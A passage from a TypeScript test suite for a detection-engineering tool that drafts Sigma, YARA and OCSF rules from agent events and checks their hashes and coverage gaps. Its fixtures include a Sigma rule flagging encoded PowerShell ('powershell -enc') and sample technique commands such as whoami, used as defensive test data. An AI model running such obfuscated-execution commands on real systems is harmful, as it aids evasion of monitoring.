        expect(pt.trace.guardResults.length).toBeGreaterThan(0);
      }
    }
  });
});

// ---------------------------------------------------------------------------
// Scenario: Full publication lifecycle with all adapters
// ---------------------------------------------------------------------------

describe("Scenario: Publication SHA-256 integrity across all adapters", () => {
  const adaptersToTest: FileType[] = ["sigma_rule", "yara_rule", "ocsf_event", "clawdstrike_policy"];
  const publicationSourceByType: Record<FileType, string> = {
    sigma_rule: [
      "title: Suspicious PowerShell",
      "id: 2f8e8e4c-5575-4d52-986d-75e3cedefc31",
      "status: experimental",
      "logsource:",
      "  product: windows",
      "  category: process_creation",
      "detection:",
      "  selection:",
      "    CommandLine|contains: powershell -enc",
      "  condition: selection",
    ].join("\n"),
    yara_rule: [
      "rule suspicious_binary {",
      "  strings:",
      "    $mz = { 4D 5A }",
      "  condition:",
      "    $mz",
      "}",
    ].join("\n"),
    ocsf_event: JSON.stringify(
      {
        class_uid: 1001,
        activity_name: "File Activity",
        actor: { user: { name: "analyst" } },
      },
      null,
      2,
    ),
    clawdstrike_policy: [
      'version: "1.5.0"',
      "name: Test Policy",
      "guards:",
      "  shell_command:",
      "    enabled: true",
      "settings: {}",
    ].join("\n"),
    swarm_bundle: "",
    // Receipt files are read-only evidence artifacts — no publication source template.
    receipt: "",
  };

  for (const fileType of adaptersToTest) {
    it(`${fileType} adapter produces 64-char hex SHA-256 hashes in publication manifest`, async () => {
      const adapter = getAdapter(fileType);
      if (!adapter) return; // Skip if adapter not registered

      const docRef: DetectionDocumentRef = {
        documentId: crypto.randomUUID(),
        fileType,
        filePath: null,
        name: `Test ${fileType}`,
        sourceHash: "00000000",
      };

      const pubResult = await adapter.buildPublication({
        document: docRef,
        source: publicationSourceByType[fileType],
        targetFormat: "json_export",
      });

      expect(pubResult.manifest.sourceHash).toMatch(/^[0-9a-f]{64}$/);
      expect(pubResult.manifest.outputHash).toMatch(/^[0-9a-f]{64}$/);
      expect(pubResult.outputHash).toMatch(/^[0-9a-f]{64}$/);

      // sourceHash and outputHash in manifest should match the outputHash in result
      expect(pubResult.manifest.outputHash).toBe(pubResult.outputHash);
    });
  }
});

// ---------------------------------------------------------------------------
// Scenario: Coverage gap with populated coverage (deduplication)
// ---------------------------------------------------------------------------

describe("Scenario: Coverage gap deduplication against existing coverage", () => {
  it("suppresses gaps for techniques already covered by open documents", () => {
    // Events with known techniques
    const events: AgentEvent[] = [
      makeShellCommandEvent("powershell -enc SGVsbG8=", { anomalyScore: 0.9 }),
      makeShellCommandEvent("whoami"),
    ];

    // T1059.001 (powershell) is covered, T1033 (whoami) is not
    const covered = [
      {
        documentId: "existing-doc",
        fileType: "sigma_rule" as FileType,
        techniques: ["T1059.001"],
        dataSources: ["process"],
      },
    ];

    const allGaps = discoverCoverageGaps({
      events,
      openDocumentCoverage: covered,
      publishedCoverage: [],
    });

    // T1059.001 should not appear as a gap
    const t1059Gaps = allGaps.filter((g) =>
      g.techniqueHints.includes("T1059.001") && !g.techniqueHints.some((t) => t !== "T1059.001"),
    );
    expect(t1059Gaps).toHaveLength(0);

    // T1033 should appear as a gap
    const t1033Gaps = allGaps.filter((g) => g.techniqueHints.includes("T1033"));
    expect(t1033Gaps.length).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// Scenario: OCSF adapter draft and evidence from tool/prompt events
// ---------------------------------------------------------------------------

describe("Scenario: OCSF adapter draft from tool/prompt events", () => {
  it("generates OCSF events with correct class UIDs for different data sources", () => {
    const ocsfAdapter = getAdapter("ocsf_event")!;

    // Process events -> class_uid 1007
    const processEvents: AgentEvent[] = [makeShellCommandEvent("ls -la")];
    const processSeed = mapEventsToDraftSeed(processEvents, {
      preferredFormats: ["ocsf_event"],
    });
    const processDraft = ocsfAdapter.buildDraft(processSeed);
    const processOcsf = JSON.parse(processDraft.source);
    expect(processOcsf.class_uid).toBe(1007);

    // File events -> class_uid 1001
    const fileEvents: AgentEvent[] = [makeFileAccessEvent("/etc/hosts")];
    const fileSeed = mapEventsToDraftSeed(fileEvents, {
      preferredFormats: ["ocsf_event"],
    });
    const fileDraft = ocsfAdapter.buildDraft(fileSeed);
    const fileOcsf = JSON.parse(fileDraft.source);
    expect(fileOcsf.class_uid).toBe(1001);

    // Network events -> class_uid 4001
    const netEvents: AgentEvent[] = [makeNetworkEvent("example.com")];
    const netSeed = mapEventsToDraftSeed(netEvents, {
      preferredFormats: ["ocsf_event"],
    });
    const netDraft = ocsfAdapter.buildDraft(netSeed);
    const netOcsf = JSON.parse(netDraft.source);
    expect(netOcsf.class_uid).toBe(4001);
  });
});

// ---------------------------------------------------------------------------
// Scenario: YARA adapter with byte-level evidence
// ---------------------------------------------------------------------------

describe("Scenario: YARA adapter byte-level evidence pipeline", () => {
  it("builds YARA-specific byte evidence items from binary artifact events and replays them in the lab", async () => {
    const events: AgentEvent[] = [
      makeBinaryArtifactEvent("/tmp/suspicious.exe", "4d5a9000 03000000 04000000 ffff0000"),
    ];

    const seed = mapEventsToDraftSeed(events);
    expect(seed.dataSourceHints).toContain("binary");
    expect(seed.dataSourceHints).toContain("artifact");

    const yaraAdapter = getAdapter("yara_rule")!;
    expect(yaraAdapter.canDraftFrom(seed)).toBe(true);

    const docRef: DetectionDocumentRef = {
      documentId: crypto.randomUUID(),
      fileType: "yara_rule",
      filePath: null,
      name: "Test YARA Rule",
      sourceHash: "00000000",
    };

    const evidence = yaraAdapter.buildStarterEvidence(seed, docRef);

    // Should have byte-type items in positive dataset (binary content)
    expect(evidence.datasets.positive.length).toBeGreaterThan(0);
    // The first positive item should be a bytes item since we have binary content
    expect(evidence.datasets.positive[0].kind).toBe("bytes");
    if (evidence.datasets.positive[0].kind !== "bytes") {
      throw new Error("Expected byte evidence for binary artifact seed");
    }
    expect(evidence.datasets.positive[0].encoding).toBe("hex");
    expect(evidence.documentId).toBe(docRef.documentId);
    expect(evidence.fileType).toBe("yara_rule");

    const draft = yaraAdapter.buildDraft(seed);
    const labResult = await yaraAdapter.runLab({
      document: docRef,
      evidencePack: evidence,
      adapterRunConfig: { yaraSource: draft.source },
    });

    expect(labResult.run.summary.totalCases).toBeGreaterThan(0);
    expect(labResult.run.summary.failed).toBe(0);
    expect(labResult.run.explainability.length).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// Scenario: generateDraft end-to-end with format fallback
// ---------------------------------------------------------------------------

describe("Scenario: generateDraft with format fallback", () => {
  it("falls back through recommended formats when preferred format has no matching adapter", () => {
    const events: AgentEvent[] = [
      makeShellCommandEvent("bash -c 'echo test'"),
    ];

    const seed = mapEventsToDraftSeed(events);
    // Force a non-existent preferred format to test fallback
    seed.preferredFormats = ["sigma_rule"];

    const result = generateDraft(seed);
    expect(result.draft).toBeDefined();
    // Should still produce a valid draft by finding sigma adapter
    expect(result.draft.fileType).toBe("sigma_rule");
    expect(result.starterEvidence).toBeDefined();
    expect(result.starterEvidence.datasets.positive.length).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// Scenario: Document identity store path normalization
// ---------------------------------------------------------------------------

describe("Scenario: Document identity store path normalization and persistence", () => {
  let store: DocumentIdentityStore;

  beforeEach(() => {
    store = new DocumentIdentityStore();
    store.clear();
  });

  afterEach(() => {
    store.clear();
  });

  it("normalizes paths and maintains stable identity across renames", () => {
    const docId = crypto.randomUUID();
    const originalPath = "/workspace/detections/rule.yaml";
    const renamedPath = "/workspace/detections/rule-v2.yaml";

    // Register original
    store.register(originalPath, docId);
    expect(store.resolve(originalPath)).toBe(docId);

    // Move/rename
    store.move(originalPath, renamedPath);

    // Old path should no longer resolve
    expect(store.resolve(originalPath)).toBeNull();

    // New path should resolve to same documentId
    expect(store.resolve(renamedPath)).toBe(docId);
  });
});
